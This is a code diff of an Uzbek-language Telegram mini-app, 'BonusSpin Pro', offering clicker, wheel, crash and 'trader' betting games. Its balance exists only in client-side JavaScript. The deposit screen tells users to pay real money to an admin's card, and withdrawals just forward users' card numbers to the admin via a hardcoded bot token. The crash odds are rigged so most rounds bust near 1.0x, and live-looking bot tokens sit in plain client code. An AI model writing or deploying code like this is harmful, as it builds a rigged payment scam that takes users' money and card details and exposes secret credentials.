@@ -3,48 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BonusSpin - Pure JS Edition</title>
+    <title>BonusSpin Pro</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap');
         body { font-family: 'Montserrat', sans-serif; background: #0b0e14; color: white; height: 100vh; overflow: hidden; user-select: none; }
         .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); }
-        .nav-active { color: #fbbf24 !important; transform: scale(1.1); }
+        .nav-active { color: #fbbf24 !important; transform: scale(1.1); transition: 0.3s; }
         #wheel-canvas { transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); border: 8px solid #fbbf24; box-shadow: 0 0 30px rgba(251, 191, 36, 0.3); }
         .tap-anim { position: absolute; color: #fbbf24; font-weight: 900; animation: floatUp 0.6s ease-out forwards; pointer-events: none; z-index: 100; }
         @keyframes floatUp { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-120px); } }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body class="flex flex-col">
 
     <header class="p-4 flex justify-between items-center bg-[#0f172a] border-b border-white/5 z-50">
         <div class="flex items-center gap-2">
-            <div id="u-photo" class="w-10 h-10 rounded-full bg-yellow-500 flex items-center justify-center font-bold text-black border border-white text-xs">U</div>
+            <div class="w-10 h-10 rounded-full bg-yellow-500 flex items-center justify-center font-bold text-black border border-white text-xs">U</div>
             <div>
-                <p id="u-name" class="text-[10px] font-bold">User</p>
+                <p id="u-name" class="text-[10px] font-bold text-white">Yuklanmoqda...</p>
                 <p class="text-[9px] text-yellow-400">ID: <span id="u-id">000000</span></p>
             </div>
         </div>
         <div class="glass px-4 py-1 text-right border-yellow-500/50">
-            <p class="text-[9px] text-gray-400">Balans</p>
-            <span class="text-yellow-500 font-black" id="main-balance">0</span> <small class="text-[9px]">S</small>
+            <p class="text-[9px] text-gray-400 uppercase">Balans</p>
+            <span class="text-yellow-500 font-black" id="main-balance">1000</span> <small class="text-[9px]">S</small>
         </div>
     </header>
 
-    <main class="flex-1 overflow-y-auto p-4 pb-28">
+    <main class="flex-1 overflow-y-auto p-4 pb-28 no-scrollbar">
         
         <section id="sec-click" class="tab-content active flex flex-col items-center py-6">
-            <div class="w-64 h-64 bg-gradient-to-b from-yellow-400 to-orange-600 rounded-full flex items-center justify-center border-[12px] border-white/10 shadow-2xl active:scale-90 transition-transform cursor-pointer" onclick="clickerTap(event)">
+            <div class="w-64 h-64 bg-gradient-to-b from-yellow-400 to-orange-600 rounded-full flex items-center justify-center border-[12px] border-white/10 shadow-[0_0_50px_rgba(245,158,11,0.3)] active:scale-90 transition-transform cursor-pointer" onclick="clickerTap(event)">
                 <span class="text-8xl">💰</span>
             </div>
-            <div class="w-full mt-12 space-y-2 text-center">
-                <div class="flex justify-between text-xs font-bold px-2">
-                    <span>⚡ <span id="e-val">1000</span> / 1000</span>
-                    <span class="text-yellow-500">+1 S / Tap</span>
+            <div class="w-full mt-12 space-y-2">
+                <div class="flex justify-between text-[11px] font-bold px-2">
+                    <span>⚡ ENERGIYA: <span id="e-val">1000</span>/1000</span>
+                    <span class="text-yellow-500">+1 S / TAP</span>
                 </div>
                 <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden border border-white/5">
-                    <div id="e-bar" class="h-full bg-gradient-to-r from-yellow-400 to-orange-500 w-full transition-all"></div>
+                    <div id="e-bar" class="h-full bg-gradient-to-r from-yellow-400 to-orange-500 w-full transition-all duration-300"></div>
                 </div>
             </div>
         </section>
@@ -54,52 +55,67 @@
                 <div class="absolute top-0 z-10 w-0 h-0 border-l-[15px] border-l-transparent border-r-[15px] border-r-transparent border-t-[30px] border-t-red-600"></div>
                 <canvas id="wheel-canvas" width="280" height="280" class="rounded-full"></canvas>
             </div>
-            <button onclick="spin()" class="w-full bg-yellow-500 text-black font-black py-4 rounded-2xl shadow-lg">AYLANTIRISH</button>
+            <button onclick="spin()" class="w-full bg-gradient-to-r from-yellow-400 to-orange-600 text-black font-black py-4 rounded-2xl shadow-lg active:scale-95 transition-all uppercase">Barabanni Aylantirish</button>
         </section>
 
-        <section id="sec-games" class="tab-content hidden space-y-4">
+        <section id="sec-games" class="tab-content hidden space-y-6">
             <div class="glass p-4 border-l-4 border-red-600">
-                <div class="flex justify-between mb-2"><h3>🚀 CRASH (Max 2x)</h3><span id="crash-mult" class="text-2xl font-black">1.00x</span></div>
+                <div class="flex justify-between items-center mb-2">
+                    <h3 class="font-bold text-red-500">🚀 CRASH (HARD)</h3>
+                    <span id="crash-mult" class="text-2xl font-black text-yellow-500">1.00x</span>
+                </div>
                 <div class="flex gap-2">
-                    <input id="crash-bet" type="number" placeholder="Summa" class="flex-1 bg-black/40 p-3 rounded-lg text-xs outline-none">
-                    <button id="crash-btn" onclick="startCrash()" class="bg-red-600 px-6 rounded-lg font-bold text-xs uppercase">Tikish</button>
+                    <input id="crash-bet" type="number" placeholder="Tikish summasi" class="flex-1 bg-black/40 p-3 rounded-lg text-xs outline-none border border-white/10">
+                    <button id="crash-btn" onclick="startCrash()" class="bg-red-600 px-6 py-3 rounded-lg font-bold text-xs uppercase">Tikish</button>
                 </div>
             </div>
+
             <div class="glass p-4 border-l-4 border-blue-500">
-                <h3>📈 TRADER (UP/DOWN)</h3>
-                <canvas id="trader-chart" width="300" height="100" class="w-full h-24 my-2"></canvas>
+                <h3 class="font-bold text-blue-500 mb-2">📈 TRADER</h3>
+                <div class="h-32 bg-black/40 rounded-lg mb-4 relative overflow-hidden">
+                    <canvas id="trader-chart" width="300" height="120" class="w-full h-full"></canvas>
+                </div>
                 <div class="grid grid-cols-2 gap-2">
-                    <input id="trader-bet" type="number" placeholder="Summa" class="col-span-2 bg-black/40 p-3 rounded-lg text-xs outline-none">
-                    <button onclick="playTrader('up')" class="bg-green-600 py-3 rounded-lg font-bold text-xs">UP 📈</button>
-                    <button onclick="playTrader('down')" class="bg-red-600 py-3 rounded-lg font-bold text-xs">DOWN 📉</button>
+                    <input id="trader-bet" type="number" placeholder="Summa" class="col-span-2 bg-black/40 p-3 rounded-lg text-xs outline-none border border-white/10">
+                    <button onclick="playTrader('up')" class="bg-green-600 py-3 rounded-lg font-bold text-[10px] uppercase">YUQORIGA 📈</button>
+                    <button onclick="playTrader('down')" class="bg-red-600 py-3 rounded-lg font-bold text-[10px] uppercase">PASTGA 📉</button>
                 </div>
             </div>
         </section>
 
         <section id="sec-wallet" class="tab-content hidden space-y-4">
             <div class="glass p-8 text-center border-yellow-500/50">
-                <p class="text-xs text-gray-400">Balans</p>
-                <h1 class="text-4xl font-black text-white"><span id="w-val">0</span> <small class="text-yellow-500">S</small></h1>
+                <p class="text-xs text-gray-400 uppercase tracking-widest">Sizning Balansingiz</p>
+                <h1 class="text-4xl font-black text-white mt-2"><span id="w-val">1000</span> <small class="text-yellow-500 text-lg uppercase">S</small></h1>
             </div>
             <div class="grid grid-cols-2 gap-4">
-                <button onclick="openHamyon('Kiritish')" class="bg-green-600 py-4 rounded-xl font-bold text-xs">PUL KIRITISH</button>
-                <button onclick="openHamyon('Chiqarish')" class="bg-blue-600 py-4 rounded-xl font-bold text-xs">PUL YECHISH</button>
+                <button onclick="openHamyon('Kiritish')" class="bg-green-600/20 text-green-500 border border-green-600 py-4 rounded-xl font-bold text-xs uppercase">Kiritish</button>
+                <button onclick="openHamyon('Chiqarish')" class="bg-blue-600/20 text-blue-500 border border-blue-600 py-4 rounded-xl font-bold text-xs uppercase">Yechish</button>
             </div>
         </section>
+
     </main>
 
     <nav class="fixed bottom-0 w-full bg-[#0f172a] border-t border-white/5 h-20 flex justify-around items-center z-50">
-        <button onclick="tab('click', this)" class="nav-item nav-active flex flex-col items-center flex-1"><span>⛏️</span><span class="text-[9px] font-bold uppercase">Clicker</span></button>
-        <button onclick="tab('spin', this)" class="nav-item flex flex-col items-center flex-1"><span>🎡</span><span class="text-[9px] font-bold uppercase">Spin</span></button>
-        <button onclick="tab('games', this)" class="nav-item flex flex-col items-center flex-1"><span>🕹️</span><span class="text-[9px] font-bold uppercase">Games</span></button>
-        <button onclick="tab('wallet', this)" class="nav-item flex flex-col items-center flex-1"><span>💼</span><span class="text-[9px] font-bold uppercase">Wallet</span></button>
+        <button onclick="tab('click', this)" class="nav-item nav-active flex flex-col items-center flex-1">
+            <span class="text-xl">⛏️</span><span class="text-[9px] font-bold mt-1 uppercase">Clicker</span>
+        </button>
+        <button onclick="tab('spin', this)" class="nav-item flex flex-col items-center flex-1">
+            <span class="text-xl">🎡</span><span class="text-[9px] font-bold mt-1 uppercase">Spin</span>
+        </button>
+        <button onclick="tab('games', this)" class="nav-item flex flex-col items-center flex-1">
+            <span class="text-xl">🕹️</span><span class="text-[9px] font-bold mt-1 uppercase">Games</span>
+        </button>
+        <button onclick="tab('wallet', this)" class="nav-item flex flex-col items-center flex-1">
+            <span class="text-xl">💼</span><span class="text-[9px] font-bold mt-1 uppercase">Wallet</span>
+        </button>
     </nav>
 
     <div id="h-modal" class="fixed inset-0 bg-black/95 hidden z-[100] p-6 flex items-center justify-center">
-        <div class="glass w-full p-6 space-y-4">
-            <h2 id="m-title" class="text-xl font-black text-yellow-500"></h2>
+        <div class="glass w-full max-w-sm p-6 space-y-4">
+            <h2 id="m-title" class="text-xl font-black text-yellow-500 uppercase"></h2>
             <div id="m-body" class="space-y-4 text-sm"></div>
-            <button onclick="closeModal()" class="w-full py-3 bg-white/5 rounded-xl text-xs">YOPISH</button>
+            <button onclick="closeModal()" class="w-full py-3 bg-white/5 rounded-xl font-bold text-xs">YOPISH</button>
         </div>
     </div>
 
@@ -107,28 +123,36 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // --- ADMIN SOZLAMALARI ---
-        const BOT_TOKEN = '8279709889:AAHSLixluhgMfap2ZYlNx4YuVEeuUal3h8I'; // BotFatherdan olingan token
-        const ADMIN_ID = '8332954728';    // O'zingizni ID raqamingiz
-        const ADMIN_CARD = "8600 1234 5678 9012";
-        const ADMIN_USER = "@d9017";
+        // --- ⚙️ SOZLAMALAR (TOKEN VA ID) ---
+        const BOT_TOKEN = '8212389925:AAGuAPm2xYo1M2XbXqOsb_s8dTfUE1Racxc'; // BotFather dan olingan token
+        const ADMIN_ID = '8332954728';    // Sizning ID raqamingiz
+        const ADMIN_CARD = "8600 0000 0000 0000"; // Admin kartasi
+        const ADMIN_USER = "@d9017";             // Admin usernamesi
 
-        let balance = 0, energy = 1000, rot = 0, isSpinning = false;
+        let balance = 1000, energy = 1000, rot = 0, isSpinning = false;
         let crashRunning = false, crashMult = 1.0, crashInterval;
         let traderPrice = 50, traderHistory = Array(30).fill(50);
 
+        // Telegram User Data
         if(tg.initDataUnsafe.user) {
             document.getElementById('u-name').innerText = tg.initDataUnsafe.user.first_name;
             document.getElementById('u-id').innerText = tg.initDataUnsafe.user.id.toString().slice(-6);
         }
 
-        // --- BOTGA XABAR YUBORISH (PURE JS) ---
+        // --- 🛠 CORE FUNCTIONS ---
         async function sendToAdmin(msg) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            await fetch(url);
+            try { await fetch(url); } catch(e) { console.error("Xabar ketmadi!"); }
         }
 
-        // --- CLICKER ---
+        function updateUI() {
+            document.getElementById('main-balance').innerText = balance.toLocaleString();
+            document.getElementById('w-val').innerText = balance.toLocaleString();
+            document.getElementById('e-val').innerText = energy;
+            document.getElementById('e-bar').style.width = (energy / 10) + "%";
+        }
+
+        // --- ⛏️ CLICKER ---
         function clickerTap(e) {
             if(energy <= 0) return;
             energy--; balance += 1; updateUI();
@@ -139,7 +163,7 @@
             tg.HapticFeedback.impactOccurred('light');
         }
 
-        // --- SPIN ---
+        // --- 🎡 SPIN (WHEEL) ---
         const canvas = document.getElementById('wheel-canvas'), ctx = canvas.getContext('2d');
         const prizes = [0, 500, 0, 1000, 0, 100, 500, 0];
         function drawWheel() {
@@ -152,7 +176,6 @@
             });
         }
         drawWheel();
-
         function spin() {
             if(isSpinning) return;
             isSpinning = true;
@@ -162,97 +185,86 @@
                 isSpinning = false;
                 const idx = Math.floor((360 - (rot%360))/45) % 8;
                 const win = prizes[idx]; balance += win; updateUI();
-                alert(win > 0 ? `Yutuq: ${win} S!` : "Omad kelmadi!");
+                alert(win > 0 ? `TABRIKLAYMIZ! YUTUQ: ${win} S` : "OMAD KELMADI!");
             }, 5000);
         }
 
-        // --- CRASH ---
+        // --- 🚀 CRASH ---
         function startCrash() {
-            const bet = parseInt(document.getElementById('crash-bet').value);
+            const betInput = document.getElementById('crash-bet');
+            const bet = parseInt(betInput.value);
             if(crashRunning) {
                 crashRunning = false; clearInterval(crashInterval);
-                balance += Math.floor(bet * crashMult); updateUI();
-                alert("Yutuq saqlandi!"); document.getElementById('crash-btn').innerText="TIKISH"; return;
+                const win = Math.floor(bet * crashMult); balance += win; updateUI();
+                alert(`G'ALABA! +${win} S`); document.getElementById('crash-btn').innerText="TIKISH"; return;
             }
-            if(balance < bet || isNaN(bet)) return alert("Balans kam!");
+            if(isNaN(bet) || balance < bet) return alert("Balans kam yoki summa kiritilmagan!");
             balance -= bet; updateUI(); crashRunning = true; crashMult = 1.0;
             document.getElementById('crash-btn').innerText="CASHOUT";
-            const limit = Math.random() < 0.8 ? (Math.random()*0.5 + 1.0).toFixed(2) : 1.95;
+            const limit = Math.random() < 0.8 ? (Math.random()*0.4 + 1.01).toFixed(2) : 1.9;
             crashInterval = setInterval(() => {
                 crashMult += 0.01; document.getElementById('crash-mult').innerText = crashMult.toFixed(2)+"x";
-                if(crashMult >= limit) { clearInterval(crashInterval); crashRunning = false; alert("PORTLADI!"); document.getElementById('crash-btn').innerText="TIKISH"; }
+                if(crashMult >= limit) { clearInterval(crashInterval); crashRunning = false; alert("BOOM! Portladi."); document.getElementById('crash-btn').innerText="TIKISH"; }
             }, 100);
         }
 
-        // --- TRADER ---
+        // --- 📈 TRADER ---
         function playTrader(side) {
             const bet = parseInt(document.getElementById('trader-bet').value);
-            if(balance < bet || isNaN(bet)) return alert("Balans kam!");
-            balance -= bet; updateUI(); const start = traderPrice;
-            alert("5 soniya kuting...");
+            if(isNaN(bet) || balance < bet) return alert("Balans kam!");
+            balance -= bet; updateUI(); const startPrice = traderPrice;
+            alert("Tikildi! 5 soniyadan keyin natija...");
             setTimeout(() => {
-                const win = (side==='up' && traderPrice > start) || (side==='down' && traderPrice < start);
-                if(win) { balance += bet*1.8; alert("G'ALABA!"); } else alert("MAG'LUBIYAT!");
+                const win = (side==='up' && traderPrice > startPrice) || (side==='down' && traderPrice < startPrice);
+                if(win) { balance += bet*1.8; alert("💰 YUTDINGIZ!"); } else alert("📉 YUTQAZDINGIZ!");
                 updateUI();
             }, 5000);
         }
-
-        // Chart simulyatsiyasi
         setInterval(() => {
-            traderPrice += (Math.random()-0.5)*5;
+            traderPrice += (Math.random()-0.5)*5; if(traderPrice<10) traderPrice=20; if(traderPrice>100) traderPrice=80;
             traderHistory.push(traderPrice); traderHistory.shift();
             const c = document.getElementById('trader-chart').getContext('2d');
-            c.clearRect(0,0,300,100); c.beginPath(); c.strokeStyle="#2563eb";
-            traderHistory.forEach((p,i) => { const x=(i/29)*300, y=100-p; if(i===0)c.moveTo(x,y);else c.lineTo(x,y); });
+            c.clearRect(0,0,300,120); c.beginPath(); c.strokeStyle="#2563eb"; c.lineWidth=2;
+            traderHistory.forEach((p,i) => { const x=(i/29)*300, y=120-p; if(i===0)c.moveTo(x,y);else c.lineTo(x,y); });
             c.stroke();
         }, 500);
 
-        // --- HAMYON ---
+        // --- 💼 WALLET & MODAL ---
         function openHamyon(t) {
-            const m = document.getElementById('h-modal'); m.classList.remove('hidden');
-            document.getElementById('m-title').innerText = t.toUpperCase();
+            document.getElementById('h-modal').classList.remove('hidden');
+            document.getElementById('m-title').innerText = t;
             const b = document.getElementById('m-body');
             if(t==='Chiqarish') {
                 b.innerHTML = `
-                    <input id="os" type="number" placeholder="Yechish summasi" class="w-full p-4 glass outline-none">
+                    <input id="os" type="number" placeholder="Summa" class="w-full p-4 glass outline-none">
                     <input id="oc" type="text" placeholder="Karta raqami" class="w-full p-4 glass outline-none">
-                    <button onclick="withdrawRequest()" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-xl">TASDIQLASH</button>
+                    <button onclick="reqWithdraw()" class="w-full py-4 bg-yellow-500 text-black font-bold rounded-xl uppercase">So'rov yuborish</button>
                 `;
             } else {
                 b.innerHTML = `
-                    <input id="is" type="number" placeholder="Qancha kiritasiz?" class="w-full p-4 glass outline-none">
-                    <select id="it" class="w-full p-4 glass bg-gray-900"><option>Uzcard</option><option>Humo</option></select>
-                    <button onclick="depositInfo()" class="w-full py-4 bg-green-600 font-bold rounded-xl">DAVOM ETISH</button>
+                    <p>To'lov summasini kiriting:</p>
+                    <input id="is" type="number" placeholder="Summa" class="w-full p-4 glass outline-none">
+                    <button onclick="showDepInfo()" class="w-full py-4 bg-green-600 font-bold rounded-xl uppercase">Davom etish</button>
                 `;
             }
         }
 
-        async function withdrawRequest() {
-            const s = document.getElementById('os').value, c = document.getElementById('oc').value;
-            if(balance < s) return alert("Balans yetarli emas!");
-            const user = tg.initDataUnsafe.user?.username || 'user';
-            const msg = `💰 **YECHISH SO'ROVI**\n👤 @${user}\n💵 Summa: ${s} S\n💳 Karta: \`${c}\``;
-            await sendToAdmin(msg);
-            alert("So'rov yuborildi!"); closeModal();
-        }
-
-        function depositInfo() {
+        function showDepInfo() {
             const s = document.getElementById('is').value;
-            const b = document.getElementById('m-body');
-            b.innerHTML = `
-                <div class="glass p-4 border border-yellow-500/50">
-                    Siz kiritmoqchi bo'lgan summa: <b>${s} S</b><br>
-                    Admin kartasi: <b class="text-yellow-400">${ADMIN_CARD}</b><br><br>
-                    To'lovdan so'ng ${ADMIN_USER} adminga skrinshot va ID yuboring.
+            document.getElementById('m-body').innerHTML = `
+                <div class="p-4 glass border border-yellow-500/50 leading-relaxed">
+                    Summa: <b>${s} S</b><br>Admin kartasi: <b class="text-yellow-400">${ADMIN_CARD}</b><br>
+                    To'lovdan so'ng ${ADMIN_USER} ga skrinshotni yuboring.
                 </div>
             `;
         }
 
-        function updateUI() {
-            document.getElementById('main-balance').innerText=balance.toLocaleString();
-            document.getElementById('w-val').innerText=balance.toLocaleString();
-            document.getElementById('e-val').innerText=energy;
-            document.getElementById('e-bar').style.width=(energy/10)+"%";
+        async function reqWithdraw() {
+            const s = document.getElementById('os').value, c = document.getElementById('oc').value;
+            const user = tg.initDataUnsafe.user?.username || 'noma\'lum';
+            const msg = `🔔 **Yangi yechish so'rovi!**\n👤 User: @${user}\n💵 Summa: ${s} S\n💳 Karta: \`${c}\``;
+            await sendToAdmin(msg);
+            alert("So'rov yuborildi!"); closeModal();
         }
 
         function tab(t, b) {
@@ -263,7 +275,7 @@
         }
 
         function closeModal() { document.getElementById('h-modal').classList.add('hidden'); }
-        setInterval(() => { if(energy < 1000) { energy++; updateUI(); } }, 2000);
+        setInterval(() => { if(energy < 1000) { energy++; updateUI(); } }, 3000);
         updateUI();
     </script>
 </body>
